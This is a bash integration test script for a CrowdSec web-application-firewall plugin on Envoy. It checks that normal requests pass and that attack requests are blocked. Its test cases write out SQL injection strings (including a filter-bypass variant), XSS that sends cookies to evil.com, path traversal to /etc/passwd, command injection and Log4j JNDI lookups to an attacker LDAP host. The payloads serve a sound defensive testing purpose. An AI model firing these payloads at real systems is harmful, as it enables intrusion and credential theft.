#!/bin/bash
set -euo pipefail

ENVOY_URL="${ENVOY_URL:-http://localhost:8000}"
ENVOY_ASYNC_URL="${ENVOY_ASYNC_URL:-http://localhost:8001}"
ENVOY_FAILOPEN_URL="${ENVOY_FAILOPEN_URL:-http://localhost:8002}"
PASS=0
FAIL=0
TOTAL=0

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

assert_status() {
    local description="$1"
    local expected="$2"
    shift 2
    TOTAL=$((TOTAL + 1))

    local status
    status=$(curl -s -o /dev/null -w '%{http_code}' "$@" 2>/dev/null) || true

    if [ "$status" = "$expected" ]; then
        echo -e "${GREEN}PASS${NC} [$status] $description"
        PASS=$((PASS + 1))
    else
        echo -e "${RED}FAIL${NC} [$status expected $expected] $description"
        FAIL=$((FAIL + 1))
    fi
}

# Asserts on status code AND whether the body contains (or, with want=0, must not
# contain) a marker string. Used to catch cases where the status code alone can't
# tell a real backend response apart from a synthesized one (e.g. a bot-detection
# challenge page also returns 200, same as a real passthrough response).
assert_body() {
    local description="$1"
    local expected_status="$2"
    local want="$3" # 1 = body must contain needle, 0 = body must not contain needle
    local needle="$4"
    shift 4
    TOTAL=$((TOTAL + 1))

    local tmp
    tmp=$(mktemp)
    local status
    status=$(curl -s -o "$tmp" -w '%{http_code}' "$@" 2>/dev/null) || true

    local has_needle=0
    grep -q -- "$needle" "$tmp" && has_needle=1

    if [ "$status" = "$expected_status" ] && [ "$has_needle" = "$want" ]; then
        echo -e "${GREEN}PASS${NC} [$status] $description"
        PASS=$((PASS + 1))
    else
        echo -e "${RED}FAIL${NC} [$status expected $expected_status, body match=$has_needle expected $want] $description"
        FAIL=$((FAIL + 1))
    fi
    rm -f "$tmp"
}

echo "============================================="
echo " CrowdSec WASM Bouncer - Integration Tests"
echo "============================================="
echo ""
echo "Target: $ENVOY_URL"
echo ""

# -----------------------------------------------------------
# Wait for envoy to be ready
# -----------------------------------------------------------
echo -e "${YELLOW}Waiting for Envoy to be ready...${NC}"
for i in $(seq 1 120); do
    if curl -sf -o /dev/null "$ENVOY_URL/get" 2>/dev/null; then
        echo -e "${GREEN}Envoy is ready.${NC}"
        break
    fi
    if [ "$i" -eq 120 ]; then
        echo -e "${RED}Envoy did not become ready in time.${NC}"
        exit 1
    fi
    sleep 2
done
echo ""

# -----------------------------------------------------------
# Legitimate requests — should pass (200)
# -----------------------------------------------------------
echo -e "${YELLOW}=== Legitimate Requests (expect 200) ===${NC}"
echo ""

assert_status "GET simple request" 200 \
    "$ENVOY_URL/get"

assert_status "GET with query params" 200 \
    "$ENVOY_URL/get?foo=bar&page=1"

assert_status "POST JSON body" 200 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/json" \
    -d '{"username":"alice","email":"alice@example.com"}'

assert_status "PUT JSON body" 200 \
    -X PUT "$ENVOY_URL/put" \
    -H "Content-Type: application/json" \
    -d '{"id":1,"name":"updated item"}'

assert_status "PATCH JSON body" 200 \
    -X PATCH "$ENVOY_URL/patch" \
    -H "Content-Type: application/json" \
    -d '{"status":"active"}'

assert_status "POST form-urlencoded" 200 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'username=alice&password=correcthorsebatterystaple'

assert_status "POST multipart form" 200 \
    -X POST "$ENVOY_URL/post" \
    -F "file=@/dev/null;filename=empty.txt" \
    -F "description=test upload"

assert_status "DELETE request" 200 \
    -X DELETE "$ENVOY_URL/delete"

assert_status "GET with normal user-agent" 200 \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
    "$ENVOY_URL/get"

assert_status "POST large-ish JSON body" 200 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/json" \
    -d "{\"data\":\"$(head -c 4096 /dev/urandom | base64 | tr -d '\n')\"}"

echo ""

# -----------------------------------------------------------
# SQL Injection — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== SQL Injection (expect 403) ===${NC}"
echo ""

assert_status "SQLi in GET query param" 403 \
    "$ENVOY_URL/get?id=1%20OR%201%3D1--"

assert_status "SQLi UNION SELECT in query" 403 \
    "$ENVOY_URL/get?id=1%20UNION%20SELECT%20username,password%20FROM%20users--"

assert_status "SQLi in POST JSON body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' OR 1=1--","password":"x"}'

assert_status "SQLi in POST form body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin'%20OR%201%3D1--&password=x"

assert_status "SQLi with sleep in body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "id=1;WAITFOR DELAY '0:0:5'--"

# Regression for the AppSec body-truncation bypass: a leading non-ASCII byte must
# not hide the SQLi payload that follows it from AppSec inspection.
assert_status "SQLi hidden behind leading non-ASCII byte (bypass regression)" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary $'\xC3\xA9username=admin\' OR 1=1--&password=x'

echo ""

# -----------------------------------------------------------
# XSS — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== XSS Attacks (expect 403) ===${NC}"
echo ""

assert_status "XSS script tag in GET param" 403 \
    "$ENVOY_URL/get?q=%3Cscript%3Ealert(1)%3C/script%3E"

assert_status "XSS in POST body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'comment=<script>document.location="http://evil.com/?c="+document.cookie</script>'

assert_status "XSS img onerror in body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'input=<img src=x onerror=alert(1)>'

assert_status "XSS event handler in query" 403 \
    "$ENVOY_URL/get?x=%22%20onmouseover%3Dalert(1)%20%22"

echo ""

# -----------------------------------------------------------
# Path Traversal — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== Path Traversal (expect 403) ===${NC}"
echo ""

assert_status "Path traversal /etc/passwd" 403 \
    "$ENVOY_URL/get?file=../../../etc/passwd"

assert_status "Path traversal encoded" 403 \
    "$ENVOY_URL/get?file=..%2F..%2F..%2Fetc%2Fpasswd"

assert_status "Dot-env file access" 403 \
    "$ENVOY_URL/.env"

echo ""

# -----------------------------------------------------------
# Command Injection — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== Command Injection (expect 403) ===${NC}"
echo ""

assert_status "OS command injection in body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'cmd=;cat /etc/passwd'

echo ""

# -----------------------------------------------------------
# Log4j / JNDI — should block (403)
# -----------------------------------------------------------
echo -e "${YELLOW}=== Log4j / JNDI (expect 403) ===${NC}"
echo ""

assert_status "JNDI in User-Agent header" 403 \
    -H 'User-Agent: ${jndi:ldap://evil.com/a}' \
    "$ENVOY_URL/get"

assert_status "JNDI in POST body" 403 \
    -X POST "$ENVOY_URL/post" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'input=${jndi:ldap://evil.com/exploit}'

echo ""

# -----------------------------------------------------------
# Large payload tests — 1GB
# -----------------------------------------------------------
echo -e "${YELLOW}=== Large Payload Tests (1GB) ===${NC}"
echo ""

# 1GB POST with SQLi in the first line — should block (403)
TOTAL=$((TOTAL + 1))
description="1GB POST with SQLi in first line"
status=$( (printf "username=admin' OR 1=1--&data="; dd if=/dev/urandom bs=1M count=1024 status=none) \
    | curl -s -o /dev/null -w '%{http_code}' \
        -X POST "$ENVOY_URL/upload" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -T - 2>/dev/null) || true
if [ "$status" = "403" ]; then
    echo -e "${GREEN}PASS${NC} [$status] $description"
    PASS=$((PASS + 1))
else
    echo -e "${RED}FAIL${NC} [$status expected 403] $description"
    FAIL=$((FAIL + 1))
fi

# 1GB POST legitimate — should pass (200)
TOTAL=$((TOTAL + 1))
description="1GB POST legitimate payload"
status=$(dd if=/dev/urandom bs=1M count=1024 status=none \
    | curl -s -o /dev/null -w '%{http_code}' \
        -X POST "$ENVOY_URL/upload" \
        -H "Content-Type: application/octet-stream" \
        -T - 2>/dev/null) || true
if [ "$status" = "200" ]; then
    echo -e "${GREEN}PASS${NC} [$status] $description"
    PASS=$((PASS + 1))
else
    echo -e "${RED}FAIL${NC} [$status expected 200] $description"
    FAIL=$((FAIL + 1))
fi

echo ""

# -----------------------------------------------------------
# Bot Detection Challenge (AppSec bot_detection feature)
# -----------------------------------------------------------
# tests/crowdsec/appsec-configs/bot-challenge-test.yaml scopes the challenge trigger
# to /challenge-test only, so it can't interfere with the 200/403 assertions above
# (curl can never solve the PoW, so a globally-applied challenge would silently turn
# every "legitimate 200" case above into a 200-status challenge page instead of real
# backend content).
echo -e "${YELLOW}=== Bot Detection Challenge ===${NC}"
echo ""

assert_body "Challenge issued on scoped test path" 200 1 "CrowdSec Challenge" \
    "$ENVOY_URL/challenge-test"

assert_body "Normal path unaffected by bot detection (regression guard)" 200 0 "CrowdSec Challenge" \
    "$ENVOY_URL/get"

assert_status "Internal endpoint fpscanner.js reachable" 200 \
    "$ENVOY_URL/crowdsec-internal/challenge/fpscanner.js"

assert_status "Internal endpoint pow-worker.js reachable" 200 \
    "$ENVOY_URL/crowdsec-internal/challenge/pow-worker.js"

echo ""

# -----------------------------------------------------------
# CrowdSec test probe
# -----------------------------------------------------------
echo -e "${YELLOW}=== CrowdSec Test Probe ===${NC}"
echo ""

assert_status "CrowdSec AppSec test probe (expect 403)" 403 \
    "$ENVOY_URL/crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl"

assert_status "CrowdSec AppSec test probe (async) (expect 404)" 404 \
    "$ENVOY_ASYNC_URL/crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl"

assert_status "CrowdSec AppSec test probe (fail_open) (expect 404)" 404 \
    "$ENVOY_FAILOPEN_URL/crowdsec-test-NtktlJHV4TfBSK3wvlhiOBnl"
echo ""

# -----------------------------------------------------------
# Results
# -----------------------------------------------------------
echo "============================================="
echo -e " Results: ${GREEN}$PASS passed${NC}, ${RED}$FAIL failed${NC}, $TOTAL total"
echo "============================================="

if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
